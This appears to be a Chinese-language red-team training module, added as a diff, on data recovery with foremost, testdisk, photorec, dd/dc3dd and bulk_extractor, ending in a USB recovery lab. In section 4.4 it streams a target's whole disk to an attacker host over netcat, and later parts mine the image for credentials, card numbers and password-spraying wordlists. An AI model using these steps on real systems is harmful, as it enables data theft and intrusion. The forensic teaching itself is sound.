@@ -1,0 +1,849 @@
+================================================================================
+模块：数据恢复与反删除技术
+工具组：archstrike-forensics (foremost, testdisk, dd, dc3dd, bulk_extractor, etc.)
+目标读者：红队成员
+================================================================================
+
+【学习目标】
+1. 理解文件删除的底层原理以及数据为什么可以恢复
+2. 掌握 foremost 文件雕刻技术，从任意数据流中提取文件
+3. 掌握 testdisk 分区恢复和文件恢复技术
+4. 掌握 dd/dc3dd 磁盘镜像创建与验证技术
+5. 掌握 bulk_extractor 批量敏感信息提取技术
+6. 完成实践：从格式化的U盘中恢复文件
+
+【工具清单】
+- dd:              基础磁盘复制工具
+- dc3dd:           增强版dd，带实时哈希计算和进度显示
+- ddrescue:        损坏介质数据救援
+- foremost:        文件雕刻/数据恢复（基于文件头/尾特征）
+- testdisk:        分区恢复和文件系统修复
+- photorec:        testdisk伴生工具，照片/文档恢复
+- bulk_extractor:  批量提取邮箱、URL、信用卡号等信息
+- scalpel:         备选的文件雕刻工具（配置文件驱动）
+
+================================================================================
+第一部分：文件删除原理与恢复基础
+================================================================================
+
+--- 1.1 文件系统如何"删除"文件 ---
+
+  Windows (NTFS/FAT):
+    删除一个文件时，文件系统做了以下操作：
+    1. 在 MFT (NTFS) 或 目录项 (FAT) 中标记条目标志为"已删除"
+    2. 在 $Bitmap (NTFS) 或 FAT表 (FAT) 中将对应簇标记为"未分配"
+    3. 文件数据本身 ---丝毫不受影响---
+    4. 只有在该簇被新文件覆盖时，原数据才会被销毁
+
+  Linux (ext4):
+    删除一个文件时：
+    1. inode 中的链接计数 (i_links_count) 减为 0
+    2. 块位图 (Block Bitmap) 中将对应数据块标记为空闲
+    3. inode 位图中将 inode 标记为空闲
+    4. 目录项中移除文件名
+    5. 数据块内容 ---保持不变---
+
+  关键认知：
+  - 删除操作只是修改了元数据（记录哪些块被使用了）
+  - 实际数据像"幽灵"一样在磁盘上滞留
+  - 数据保留时间取决于新文件覆盖的频率
+  - SSD 由于 TRIM 命令和垃圾回收，数据恢复成功率低于 HDD
+
+--- 1.2 数据恢复的层次 ---
+
+  第一层：文件系统级恢复
+    - 取消删除标记，重新链接文件
+    - 条件：元数据未被覆盖，数据块未被重新分配
+    - 工具：testdisk, extundelete, ntfsundelete
+
+  第二层：文件雕刻 (File Carving)
+    - 不依赖文件系统元数据
+    - 搜索原始磁盘数据流中的文件头签名（魔数）
+    - 条件：数据块未被覆盖
+    - 工具：foremost, photorec, scalpel
+
+  第三层：物理级恢复
+    - 直接读取磁盘表面磁性残留
+    - 使用特殊硬件（磁力显微镜等）
+    - 成本极高，通常只有国家级机构能实施
+    - 红队一般不需要考虑这个层级
+
+--- 1.3 何时数据无法恢复 ---
+
+  以下情况会导致数据永久不可恢复：
+  1. 数据块被其他文件覆盖
+  2. SSD 执行了 TRIM（数据块被物理擦除）
+  3. 多次 shred 覆盖（3次以上对HDD，对SSD无效）
+  4. 全盘加密密钥被销毁
+  5. 物理介质损坏（盘片划伤、闪存芯片烧毁）
+  6. 加密文件且密钥丢失
+
+================================================================================
+第二部分：foremost — 文件雕刻与数据恢复
+================================================================================
+
+foremost 是最常用的文件雕刻工具，通过搜索文件头（文件签名/魔数）和文件尾
+来从原始数据流中恢复文件，完全不依赖文件系统元数据。
+
+--- 2.1 安装与基本概念 ---
+
+  sudo pacman -S foremost     # ArchStrike
+
+  工作原理：
+  1. 读取磁盘镜像的每个字节
+  2. 搜索已知的文件头签名（如 JPEG: \xFF\xD8\xFF）
+  3. 从文件头开始读取数据，直到遇到文件尾签名或达到最大大小
+  4. 将找到的数据段写入单独的文件
+
+  支持的文件类型（部分）：
+  jpg     - JPEG 图像
+  gif     - GIF 图像
+  png     - PNG 图像
+  bmp     - BMP 图像
+  pdf     - PDF 文档
+  doc     - Microsoft Word 文档
+  xls     - Microsoft Excel 文档
+  ppt     - Microsoft PowerPoint 文档
+  zip     - ZIP 压缩文件
+  rar     - RAR 压缩文件
+  exe     - Windows 可执行文件
+  avi     - AVI 视频
+  mp4     - MP4 视频
+  ole     - OLE 复合文档
+  all     - 所有内置类型
+
+--- 2.2 基本使用 ---
+
+  恢复所有类型文件：
+  foremost -t all -i disk.dd -o recovered/
+
+  参数说明：
+  -t all    : 恢复所有支持的文件类型
+  -i        : 输入文件（磁盘镜像/原始设备）
+  -o        : 输出目录（必须不存在或为空）
+
+  恢复指定类型：
+  foremost -t jpg,png,pdf,zip -i disk.dd -o recovered/
+
+  从块设备直接恢复：
+  foremost -t all -i /dev/sdb1 -o /mnt/recovery_output/
+
+  恢复过程中的输出示例：
+  Processing: disk.dd
+  |**************************************************|  100%
+  Found:  jpg=15, png=8, pdf=3, zip=2, doc=1, exe=4
+
+--- 2.2 高级选项 ---
+
+  指定块大小（影响恢复精度和性能）：
+  foremost -t all -b 4096 -i disk.dd -o recovered/
+  # -b 4096: 以4KB块为单位搜索（默认512字节）
+  # 大块 = 快但可能漏掉，小块 = 慢但更精确
+
+  只搜索磁盘的特定范围：
+  foremost -t jpg -s 1000000 -i disk.dd -o recovered/
+  # -s 1000000: 跳过前1000000个字节开始搜索
+
+  设置最大文件大小：
+  foremost -t avi -M 500M -i disk.dd -o recovered/
+  # -M 500M: 每个恢复文件最大500MB
+
+  快速模式（仅搜索文件头位置，不验证完整性）：
+  foremost -t all -q -i disk.dd -o recovered/
+  # -q: 快速模式，加快搜索速度
+
+  生成审计文件（记录所有恢复信息）：
+  foremost -t all -a -i disk.dd -o recovered/
+  # -a: 写入审计日志
+
+--- 2.3 自定义文件类型 ---
+
+  编辑 foremost 配置文件添加新的签名：
+  sudo vim /etc/foremost.conf
+
+  添加自定义规则的格式：
+  # 格式: <扩展名>  <大小写敏感>  <最大文件大小>  <文件头>  <文件尾(可选)>
+  # 示例：添加 .sqlite 数据库恢复
+  sqlite  y   100000000  \x53\x51\x4c\x69\x74\x65\x20\x66\x6f\x72\x6d\x61\x74\x20\x33\x00
+
+  使用自定义配置：
+  foremost -c /etc/foremost.conf -t sqlite -i disk.dd -o recovered/
+
+--- 2.4 输出目录结构 ---
+
+  recovered/
+  ├── audit.txt           # 恢复日志，记录每个文件的偏移、大小、类型
+  ├── jpg/
+  │   ├── 00000000.jpg    # 文件按发现顺序编号
+  │   ├── 00000001.jpg
+  │   └── ...
+  ├── png/
+  ├── pdf/
+  ├── zip/
+  └── exe/
+
+  audit.txt 示例内容：
+  Num  Name          File Size  File Offset  File Type
+  0    00000000.jpg  245 KB     1023488      jpg
+  1    00000001.jpg  1.2 MB     4598016      jpg
+  2    00000003.pdf  890 KB     12340000     pdf
+
+--- 2.5 红队实战场景 ---
+
+  场景1：从目标机器的磁盘镜像中恢复已删除的敏感文件
+    攻击目标：取证人员可能试图恢复你删除的文件
+    红队目的：理解 foremost 的工作原理，验证自己的 shred 是否有效
+
+    Step 1: 创建包含敏感信息的磁盘镜像
+      dd if=/dev/zero of=test_recover.dd bs=1M count=200
+      sudo losetup -f test_recover.dd
+      sudo mkfs.ext4 /dev/loop0
+      sudo mount /dev/loop0 /mnt/test
+
+    Step 2: 放置敏感文件
+      sudo bash -c 'echo "C2: https://evil.com" > /mnt/test/c2_config.txt'
+      sudo bash -c 'echo "API_KEY=abc123def456" > /mnt/test/api_keys.txt'
+      cp /usr/share/wallpapers/deepin/background.jpg /mnt/test/test.jpg
+      sudo wget -O /mnt/test/target_list.pdf https://example.com/doc.pdf
+
+    Step 3: "安全删除"这些文件
+      sudo shred -z -n 1 -u /mnt/test/c2_config.txt       # 只覆盖1次
+      sudo rm /mnt/test/api_keys.txt                        # 不做安全删除
+      sudo rm /mnt/test/test.jpg
+      sudo rm /mnt/test/target_list.pdf
+
+    Step 4: 使用 foremost 恢复
+      sudo umount /mnt/test
+      foremost -t all -i test_recover.dd -o foremost_output/
+
+    Step 5: 检查结果
+      ls -la foremost_output/*/
+      cat foremost_output/txt/00000000.txt     # shredded文件能恢复吗？
+      cat foremost_output/txt/00000001.txt     # 仅rm的文件能恢复吗？
+
+    预期结果：
+    - 仅被 rm 的文件 → 大概率完整恢复
+    - 被 shred 覆盖1次的文件 → 可能无法恢复（但有些HDD需要多次覆盖）
+    - test.jpg → 完整恢复（foremost能找到JPEG签名）
+
+  场景2：从内存转储中提取图像/文档
+    foremost -t jpg,png,pdf,doc -i memory.dump -o memory_foremost/
+
+    → 内存快照中可能包含浏览过的图片、打开的文档片段等
+
+  场景3：从交换文件/分页文件中提取数据
+    foremost -t all -i /dev/sda5                    # 交换分区
+    foremost -t all -i /mnt/windows/pagefile.sys     # Windows页面文件
+    foremost -t all -i /var/swapfile                 # Linux交换文件
+
+================================================================================
+第三部分：testdisk — 分区恢复与文件系统修复
+================================================================================
+
+testdisk 是强大的分区恢复工具，可以恢复损坏的分区表、使不可读的分区重新
+可读、修复引导扇区。通常与 photorec 配合使用。
+
+--- 3.1 安装 ---
+
+  sudo pacman -S testdisk       # ArchStrike，包含 testdisk + photorec
+
+--- 3.2 启动 testdisk ---
+
+  sudo testdisk
+
+  启动后进入交互式 TUI 界面（基于 ncurses 的文本界面）。
+
+--- 3.3 Step-by-Step 分区恢复 ---
+
+  Step 1: 选择日志文件创建方式
+    屏幕显示:
+    [ Create ] Create a new log file
+    [ Append ] Append information to log file
+    [ No Log ] Don't record anything
+    选择: Create (按 Enter)
+
+  Step 2: 选择要分析的磁盘
+    屏幕显示可用磁盘列表:
+    Disk /dev/sda - 256 GB / 238 GiB
+    Disk /dev/sdb - 32 GB / 29 GiB  (你的U盘)
+    使用上下箭头选择目标磁盘，按 Enter
+
+  Step 3: 选择分区表类型
+    屏幕显示:
+    [ Intel   ] Intel/PC partition
+    [ EFI GPT ] EFI GPT partition map
+    [ Humax   ] ...
+    [ Mac     ] ...
+    [ None    ] Non partitioned media
+    [ Sun     ] ...
+    [ Xbox    ] ...
+    通常:
+    - PC/MBR 的分区表选 [Intel]
+    - 现代 UEFI 系统选 [EFI GPT]
+    - 如果没有分区表选 [None]
+    选择后按 Enter
+
+  Step 4: 选择操作
+    屏幕显示菜单:
+    [ Analyse  ] Analyse current partition structure and search for lost partitions
+    [ Advanced ] Filesystem Utils
+    [ Geometry ] Change disk geometry
+    [ Options  ] Modify options
+    [ MBR Code ] Write TestDisk MBR code to first sector
+    [ Delete   ] Delete all data in the partition table
+    [ Quit     ] Return to disk selection
+
+    选择 [ Analyse ] 按 Enter → 开始分析分区结构
+
+  Step 5: 分析当前分区
+    屏幕显示当前分区表:
+    TestDisk 7.1, Data Recovery Utility, April 2019
+    Disk /dev/sdb - 32 GB / 29 GiB - CHS 3904 255 63
+    Current partition structure:
+         Partition            Start        End    Size in sectors
+     1 * FAT32 LBA             0   1  1  3904 254 63   62733312 [USB_DATA]
+
+    如果分区表被破坏了，这里会显示为空或不正确。
+
+  Step 6: 快速搜索丢失的分区
+    选择 [ Quick Search ] 按 Enter
+    testdisk 会扫描磁盘寻找文件系统签名
+
+    如果找到了丢失的分区，屏幕会显示：
+    Disk /dev/sdb - 32 GB / 29 GiB
+         Partition            Start        End    Size in sectors
+     >D FAT32 LBA             0  32 33  3904 101 15   62728192 [LOST_DATA]
+     D: deleted partition (已删除的分区)
+
+    按 Enter 继续
+
+  Step 7: 更深入的搜索 (Deeper Search)
+    如果 Quick Search 没有找到，选择 [ Deeper Search ]
+    这一步会比较慢，但可以找到被 Quick Search 漏掉的分区
+    屏幕会显示：
+    Search for partitions, please wait...
+    FAT32 LBA             0  32 33  3904 101 15   62728192 [LOST_DATA]
+
+  Step 8: 恢复分区
+    选择要恢复的分区，按 Enter
+    屏幕显示：
+    [ Write  ] Write partition structure to disk
+    选择 Write 将分区表写回磁盘
+
+    如果有多个分区，可以用左右箭头切换分区状态：
+    P: Primary (主分区)
+    L: Logical (逻辑分区)
+    E: Extended (扩展分区)
+    D: Deleted (已删除)
+    *: Bootable (可引导)
+
+  Step 9: 确认写入
+    按 y 确认，然后按 Enter
+    按 q 退出 testdisk
+    可能需要重启或重新插拔设备以使更改生效
+
+--- 3.4 使用 Advanced 模式恢复文件 ---
+
+  Step 1: 进入 Advanced 模式
+    在 testdisk 主菜单选择 [ Advanced ] → [ Boot ]
+    选择 [ Rebuild BS ] 可以重建引导扇区
+
+  Step 2: 文件列表与恢复
+    在 [ Advanced ] 菜单中选择 [ List ]
+    显示分区内的文件列表：
+    Directory /
+    drwxr-xr-x     0     0      4096 01-Jan-2024 00:00 .
+    drwxr-xr-x     0     0      4096 01-Jan-2024 00:00 ..
+    -rwxr-xr-x     0     0       512 15-Jun-2024 09:00 redteam_note.txt
+    -rwxr-xr-x     0     0      2048 15-Jun-2024 09:01 credentials.docx
+
+    红色文件 = 已删除文件
+    选择文件，按 c 复制到另一个位置
+    Step 3: 选择目标目录，按 c 开始复制
+
+--- 3.5 photorec — 伴生文件恢复工具 ---
+
+  photorec 忽略文件系统，直接从磁盘扇区中恢复文件。
+
+  sudo photorec
+
+  Step 1: 选择目标磁盘 (同 testdisk)
+  Step 2: 选择分区
+  Step 3: 选择文件系统类型
+    [ ext2/ext3 ] ext2/ext3/ext4 filesystem
+    [ Other     ] FAT/NTFS/HFS+/ReiserFS/...
+    选择 [ Other ] 用于 FAT/NTFS
+  Step 4: 选择分析空间
+    [ Free    ] Scan unallocated space only (仅未分配空间)
+    [ Whole   ] Scan whole partition (整个分区)
+    → 如果是从已格式化/删除分区的磁盘恢复，选 [Whole]
+  Step 5: 选择输出目录
+  Step 6: 按 Y 开始恢复
+
+  输出示例：
+  PhotoRec 7.1, Data Recovery Utility, April 2019
+  Disk /dev/sdb - 32 GB / 29 GiB (RO)
+       Partition            Start        End    Size in sectors
+     1 P FAT32 LBA             0   1  1  3904 254 63   62733312 [USB_DATA]
+
+  Destination /home/user/recovered_files
+
+  Pass 1 - reading sector    1234567 / 62733312, 12 files found
+  txt: 3 recovered
+  jpg: 5 recovered
+  doc: 2 recovered
+  pdf: 1 recovered
+  zip: 1 recovered
+  Total: 12 files found
+
+  恢复的文件在输出目录中，命名格式：f文件编号.扩展名
+  如：f0012345.jpg, f0012367.txt, f0012401.pdf
+
+================================================================================
+第四部分：dd/dc3dd — 磁盘镜像创建
+================================================================================
+
+--- 4.1 dd 基础 ---
+
+  创建磁盘镜像：
+  dd if=/dev/sda of=/path/to/disk.dd bs=4M status=progress
+
+  参数详解:
+  if=        输入文件/设备
+  of=        输出文件
+  bs=4M      块大小=4MB（大块 = 速度快，建议1M-4M）
+  status=progress  显示进度条
+
+  创建分区镜像：
+  dd if=/dev/sda1 of=partition1.dd bs=4M status=progress
+
+  只复制指定扇区范围：
+  dd if=/dev/sda of=boot_sector.dd bs=512 count=1    # MBR
+  dd if=/dev/sda of=mft_area.dd bs=512 skip=2048 count=2097152   # NTFS分区
+
+  管道压缩（节省空间导出）：
+  dd if=/dev/sda bs=4M status=progress | gzip -c > disk.dd.gz
+
+  恢复镜像到磁盘（危险操作）：
+  dd if=disk.dd of=/dev/sdb bs=4M status=progress
+
+--- 4.2 dc3dd — 增强版 dd ---
+
+  dc3dd 由美国国防部网络犯罪中心开发（DC3 = Defense Cyber Crime Center），
+  是 dd 的增强版，增加了哈希验证、进度显示、错误处理等功能。
+
+  安装：
+  sudo pacman -S dc3dd     # ArchStrike
+
+  创建带哈希验证的镜像：
+  sudo dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=dc3dd.log
+
+  参数详解：
+  hash=sha256    计算并显示SHA256哈希
+  hash=md5       额外计算MD5
+  log=file.log   写入详细操作日志
+  hashlog=file   单独写入哈希日志
+  rec=off        关闭错误恢复（遇到坏扇区直接停止）
+  verb=on        详细输出模式
+  wipe=pattern   用指定模式擦除后创建镜像
+
+  输出示例：
+  dc3dd 7.2.646 started at 2024-06-15 09:00:00 +0000
+  compiled options: 
+  command line: sudo dc3dd if=/dev/sda of=disk.dd hash=sha256 log=dc3dd.log
+  sector size: 512 bytes (assumed)
+  53687091200 bytes (50 G) copied, 1400.3 s, 36 M/s
+
+  input results for device `/dev/sda':
+     53687091200 bytes in
+     0 bad blocks replaced by zeros
+
+  output results for file `disk.dd':
+     53687091200 bytes out
+
+  results for hash sha256:
+     abc123def4567890abc123def4567890abc123def4567890abc123def4567890
+
+  dc3dd completed at 2024-06-15 09:23:20 +0000
+
+--- 4.3 ddrescue — 损坏介质数据救援 ---
+
+  当磁盘有坏扇区时，dd/dc3dd 会失败。ddrescue 专门处理这种情况。
+
+  sudo pacman -S ddrescue    # ArchStrike
+
+  基本用法：
+  sudo ddrescue -f /dev/sdb rescued.img rescue.log
+
+  参数:
+  -f          强制覆盖输出文件
+  rescued.img 输出镜像文件
+  rescue.log  日志文件（记录坏区位置，支持断点续传）
+
+  多轮恢复策略：
+  # 第一轮: 快速复制好区域，跳过坏区
+  sudo ddrescue -f -n /dev/sdb rescued.img rescue.log
+
+  # 第二轮: 对坏区重试3次，每次减小块大小
+  sudo ddrescue -f -d -r3 /dev/sdb rescued.img rescue.log
+
+  # 第三轮: 从后往前读（有时能绕过物理损伤）
+  sudo ddrescue -f -R /dev/sdb rescued.img rescue.log
+
+  日志文件格式：
+  # Rescue Logfile. Created by GNU ddrescue version 1.23
+  # Command line: ddrescue -f /dev/sdb rescued.img rescue.log
+  # Start time:    2024-06-15 09:30:00
+  # Current time:  2024-06-15 09:45:00
+  # Scraping failed blocks... 
+  # current_pos  current_status  current_pass
+  0x12345678     ?               1
+  #      pos        size  status
+  0x00000000  0x10000000  +
+  0x10000000  0x00001000  -
+  0x10001000  0x20000000  +
+
+  + = completed, - = bad area, * = trimming, / = scraping
+
+--- 4.4 红队场景：在攻击前创建磁盘基线 ---
+
+  在进入目标系统后，红队可能需要：
+  1. 创建磁盘镜像用于离线分析（避免触发文件系统监控）
+  2. 从镜像中恢复已删除的文件
+  3. 提取密码、配置、证书等敏感数据
+
+  场景：从目标系统中提取已删除的数据库备份
+  Step 1: 创建磁盘镜像（在攻击机上操作，通过网络传输）
+    # 在目标上: nc 管道传输
+    dd if=/dev/sda bs=4M | nc 192.168.1.50 9000
+
+    # 在攻击机上: nc 接收
+    nc -l -p 9000 > target_disk.dd
+
+  Step 2: 分析镜像
+    foremost -t sqlite,zip,gz,tar -i target_disk.dd -o db_recovery/
+
+  Step 3: 如果foremost不够，使用 bulk_extractor 提取电子邮件/URL等
+
+================================================================================
+第五部分：bulk_extractor — 批量敏感信息提取
+================================================================================
+
+bulk_extractor 是一个高速数据提取工具，可以从磁盘镜像、文件、内存转储中
+批量提取特定类型的结构化信息。它不依赖文件系统，直接扫描原始数据。
+
+--- 5.1 安装 ---
+
+  sudo pacman -S bulk_extractor    # ArchStrike
+
+--- 5.2 基本使用 ---
+
+  从磁盘镜像中提取所有类型信息：
+  bulk_extractor -o output_dir/ disk.dd
+
+  输出目录结构：
+  output_dir/
+  ├── report.xml           # 总报告
+  ├── email.txt            # 提取的电子邮件地址
+  ├── url.txt              # 提取的URL
+  ├── url_facebook.txt     # Facebook URL
+  ├── url_services.txt     # Web服务URL (AWS/GCP/Azure)
+  ├── domain.txt           # 提取的域名
+  ├── ip.txt               # IPv4地址
+  ├── ether.txt            # MAC地址
+  ├── ccn.txt              # 信用卡号码 (带Luhn验证)
+  ├── ccn_track2.txt       # 磁条Track2数据
+  ├── telephone.txt        # 电话号码
+  ├── json.txt             # JSON对象
+  ├── exif.txt             # EXIF元数据
+  ├── rar.txt              # RAR文件信息
+  ├── zip.txt              # ZIP文件信息
+  ├── pst.txt              # PST(Outlook)邮件文件
+  ├── wordlist.txt         # 单词列表（可用于密码破解）
+  ├── aes_keys.txt         # AES密钥（通过熵分析）
+  └── packets.pcap         # 网络包（如果镜像包含pcap数据）
+
+  查看每种信息的详细条目数：
+  grep -c "." output_dir/email.txt
+  grep -c "." output_dir/url.txt
+  grep -c "." output_dir/ccn.txt
+
+--- 5.3 高级选项 ---
+
+  指定扫描器子集：
+  bulk_extractor -o output/ -e email -e url -e ccn disk.dd
+  # -e: 启用指定扫描器
+
+  排除特定扫描器：
+  bulk_extractor -o output/ -x aes -x json disk.dd
+  # -x: 禁用指定扫描器
+
+  设置线程数（加速处理）：
+  bulk_extractor -o output/ -j 8 disk.dd
+  # -j 8: 使用8个线程
+
+  处理分片镜像（E01 等格式需要 afflib）：
+  bulk_extractor -o output/ -i raw image.E01
+
+  限制提取范围：
+  bulk_extractor -o output/ -S 0 -E 1000000000 disk.dd
+  # -S: 起始偏移, -E: 结束偏移（只处理前1GB）
+
+  生成特征直方图（用于熵分析）：
+  bulk_extractor -o output/ -H disk.dd
+  # 输出: output/histogram.txt（帮助识别加密/压缩区域）
+
+  递归处理目录中的所有文件：
+  bulk_extractor -o output/ -R /path/to/directory/
+  # -R: 递归处理目录
+
+--- 5.4 输出解读 ---
+
+  email.txt 示例：
+  1        admin@company.com
+  1        user@gmail.com
+  3        noreply@service.com
+  # 格式: 出现次数\t电子邮件地址
+  # 出现次数=1 可能是误报（随机字节恰好匹配模式）
+
+  url.txt 示例：
+  1        https://c2.evil-corp.com/beacon?id=
+  1        http://192.168.1.100:8080/admin
+  1        ftp://backup:pass@files.example.com/
+  2        https://google.com/search?q=
+
+  ccn.txt 示例：
+  1        4532123456789012 (Visa, Luhn: PASS)
+  1        5412751234123456 (MasterCard, Luhn: PASS)
+  # Luhn: PASS = 通过了Luhn算法验证，很可能是真实信用卡号
+
+--- 5.5 红队实战场景 ---
+
+  场景1: 快速探查目标的网络基础设施
+    攻击机从目标系统获取磁盘镜像后，使用 bulk_extractor 提取：
+    - email.txt → 了解组织结构、人员信息
+    - url.txt → 发现内网应用、云服务端点
+    - domain.txt → 识别关联域（可能有更易攻击的子域）
+    - ip.txt → 绘制内部网络拓扑
+
+  场景2: 提取凭据和密钥
+    bulk_extractor 的 wordlist.txt 包含磁盘上所有有意义字符串，
+    可用于：
+    - 密码喷洒攻击
+    - 生成自定义字典
+    - 发现硬编码的凭据
+
+  场景3: 分析PCAP痕迹
+    bulk_extractor 可以从磁盘镜像中提取网络包（如果存在）：
+    ls output_dir/packets.pcap
+    # 可能从:
+    # - 未删除的临时pcap文件
+    # - Wireshark 缓存
+    # - 恶意软件抓包功能残留
+    # - 浏览器缓存中的网络数据
+
+  场景4: 反取证验证
+    在自己的攻击工具磁盘上运行 bulk_extractor，验证：
+    - 是否有硬编码的 C2 IP/域名？
+    - 是否有测试用凭据残留？
+    - 是否有未清理的日志和URL？
+
+    bulk_extractor -o self_audit/ -e email -e url -e ccn /path/to/tool/disk/
+
+================================================================================
+第六部分：实践演练 — U盘格式化后数据恢复
+================================================================================
+
+--- 6.1 实验准备 ---
+
+  需要一个测试用的U盘（至少 2GB，数据可丢弃的）：
+
+  Step 1: 将测试文件写入U盘
+    # 挂载U盘 (假设为 /dev/sdb1, 挂载到 /mnt/usb)
+    sudo mount /dev/sdb1 /mnt/usb
+
+    # 写入各种类型的测试文件
+    echo "This is a secret note: C2 is at 10.10.10.100:8080" > /mnt/usb/secret.txt
+    echo "admin:SuperSecret2024!" > /mnt/usb/credentials.txt
+    wget -O /mnt/usb/test.jpg https://picsum.photos/200/300
+    echo "TODO: escalate privileges on DC01" > /mnt/usb/todo.txt
+    echo "Targets: 192.168.1.10, 192.168.1.20, 192.168.1.30" > /mnt/usb/targets.txt
+    cp /usr/bin/python3 /mnt/usb/python_copy
+    cp /etc/hosts /mnt/usb/hosts_copy
+
+    # 检查文件
+    ls -la /mnt/usb/
+    # 应有: secret.txt, credentials.txt, test.jpg, todo.txt, targets.txt,
+    #       python_copy, hosts_copy
+
+  Step 2: 安全卸载U盘
+    sudo umount /mnt/usb
+
+  Step 3: "销毁证据" — 快速格式化U盘
+    sudo mkfs.vfat -F 32 /dev/sdb1
+    # 快速格式化只重写文件系统元数据，数据区域保持不变
+
+  Step 4: 验证格式化
+    sudo mount /dev/sdb1 /mnt/usb
+    ls /mnt/usb/
+    # 应该为空 — 文件"消失"了
+    sudo umount /mnt/usb
+
+--- 6.2 方法一：使用 foremost 恢复文件 ---
+
+  Step 5: 使用 foremost 扫描格式化后的U盘
+    sudo foremost -t all -i /dev/sdb1 -o ~/usb_recovery_foremost/
+
+  Step 6: 检查恢复结果
+    ls -la ~/usb_recovery_foremost/
+
+    查看有哪些类型被恢复：
+    ls ~/usb_recovery_foremost/txt/
+    ls ~/usb_recovery_foremost/jpg/
+    ls ~/usb_recovery_foremost/exe/
+
+  Step 7: 验证恢复内容
+    cat ~/usb_recovery_foremost/txt/00000000.txt
+    # 应该能看到 secret.txt 或 targets.txt 的内容
+    cat ~/usb_recovery_foremost/txt/00000001.txt
+    # 应该能看到 credentials.txt 或 todo.txt 的内容
+
+    注意：foremost 不保留原始文件名，文件按发现的顺序编号。
+    需要人工查看内容来识别哪个是哪个。
+
+    对于 test.jpg:
+    xdg-open ~/usb_recovery_foremost/jpg/00000000.jpg
+    # 应该能看到原始图片
+
+  Step 8: 查看审计日志
+    cat ~/usb_recovery_foremost/audit.txt
+    # 可以看到每个文件在磁盘上的偏移位置和大小
+
+--- 6.3 方法二：使用 photorec 恢复文件 ---
+
+  Step 9: 启动 photorec
+    sudo photorec
+
+  Step 10: 按 TUI 指引操作
+    - 选择 /dev/sdb (U盘设备)
+    - 选择分区 /dev/sdb1
+    - 文件系统选 [Other] (FAT)
+    - 分析空间选 [Whole] (整个分区)
+    - 输出目录: ~/usb_recovery_photorec/
+    - 按 Y 开始恢复
+
+  Step 11: 对比恢复结果
+    ls ~/usb_recovery_photorec/recup_dir.1/
+    # photorec 会创建 recup_dir.1, recup_dir.2 ... 存放恢复文件
+    find ~/usb_recovery_photorec/ -type f | wc -l
+    # 统计恢复文件总数
+
+  Step 12: 筛选恢复的文件
+    # 只查看文本文件
+    find ~/usb_recovery_photorec/ -name "*.txt" -exec head {} \;
+
+    # 查找特定内容
+    grep -r "C2" ~/usb_recovery_foremost/
+    grep -r "password" ~/usb_recovery_foremost/
+    grep -r "192.168" ~/usb_recovery_foremost/
+
+--- 6.4 方法三：使用 bulk_extractor 提取结构化数据 ---
+
+  Step 13: 运行 bulk_extractor
+    bulk_extractor -o ~/usb_bulk/ -e email -e url -e telephone /dev/sdb1
+
+  Step 14: 检查提取结果
+    cat ~/usb_bulk/url.txt
+    # 应该能看到嵌入的URL（C2地址、picsum URL）
+
+    cat ~/usb_bulk/email.txt
+    # email 模式不太可能匹配到我们的测试数据（没有@符号）
+
+  Step 15: 用 bulk_extractor 的词表功能生成字典
+    bulk_extractor -o ~/usb_wordlist/ /dev/sdb1
+    cat ~/usb_wordlist/wordlist.txt | head -50
+    # 这些词是从原始数据中提取的，可能包含敏感的密码或密钥
+
+--- 6.5 方法四：使用 testdisk 恢复分区 ---
+
+  如果连分区表都被破坏了（而不仅仅是格式化）：
+
+  Step 16: 使用 fdisk 删除U盘分区
+    sudo fdisk /dev/sdb
+    # 按 d 删除分区
+    # 按 w 写入并退出
+
+    # 现在U盘看起来是"未分区"的空白磁盘
+    lsblk /dev/sdb
+    # 没有分区显示
+
+  Step 17: 使用 testdisk 恢复分区
+    sudo testdisk
+
+    TUI 操作:
+    → Create (创建日志)
+    → 选择 /dev/sdb
+    → [Intel] (分区表类型)
+    → [Analyse]
+    → [Quick Search] → 发现丢失的分区
+    → 选中分区按 Enter → [Write] → Y 确认
+    → Quit 退出
+
+    # 重新插拔U盘或运行 partprobe
+    sudo partprobe /dev/sdb
+
+  Step 18: 挂载并验证
+    sudo mount /dev/sdb1 /mnt/usb
+    ls /mnt/usb/
+    # 格式化后的文件已经不可见了，但分区结构恢复了
+    # 现在可以再用 foremost/photorec 恢复文件
+
+--- 6.6 附加实验：安全删除效果测试 ---
+
+  Step 19: 测试不同删除方法的效果
+    # 重新格式化U盘并写入测试文件
+    sudo mkfs.vfat -F 32 /dev/sdb1
+    sudo mount /dev/sdb1 /mnt/usb
+    echo "TEST1: rm only" > /mnt/usb/rm_test.txt
+    echo "TEST2: shred -n1" > /mnt/usb/shred1_test.txt
+    echo "TEST3: shred -n3" > /mnt/usb/shred3_test.txt
+    echo "TEST4: shred -n7" > /mnt/usb/shred7_test.txt
+
+    rm /mnt/usb/rm_test.txt
+    shred -z -n 1 -u /mnt/usb/shred1_test.txt
+    shred -z -n 3 -u /mnt/usb/shred3_test.txt
+    shred -z -n 7 -u /mnt/usb/shred7_test.txt
+    sudo umount /mnt/usb
+
+  Step 20: 尝试恢复
+    foremost -t txt -i /dev/sdb1 -o ~/usb_shred_test/
+
+  Step 21: 检查每个文件的恢复成功率
+    ls -la ~/usb_shred_test/txt/
+    for f in ~/usb_shred_test/txt/*; do
+      echo "=== $(basename $f) ==="
+      cat "$f"
+      echo ""
+    done
+
+    预期结果：
+    - rm_only:        完整恢复
+    - shred -n 1:     可能恢复（HDD）或不可恢复（SSD）
+    - shred -n 3:     大概率不可恢复
+    - shred -n 7:     几乎不可能恢复
+    - 但！如果是 SSD：以上都不可靠，TRIM 可能已经物理擦除了数据
+
+================================================================================
+关键总结
+================================================================================
+
+1. 文件删除只是元数据标记，数据本身在磁盘上持续存在。
+2. foremost/photorec 可以从格式化后的磁盘中恢复大量文件。
+3. bulk_extractor 是提取敏感结构化信息（邮件、URL、信用卡号）的利器。
+4. testdisk 可以恢复损坏的分区表和引导扇区。
+5. dc3dd 是 dd 的生产级替代品，必须的计算哈希实现数据完整性验证。
+6. SSD 的 TRIM 使数据恢复更困难，但仍不能 100% 保证数据已销毁。
+7. 红队应定期对自有设备进行恢复演练，确保安全删除策略有效。
+8. 最可靠的反取证策略是：全盘加密 + 严格的文件生命周期管理。
+
+================================================================================
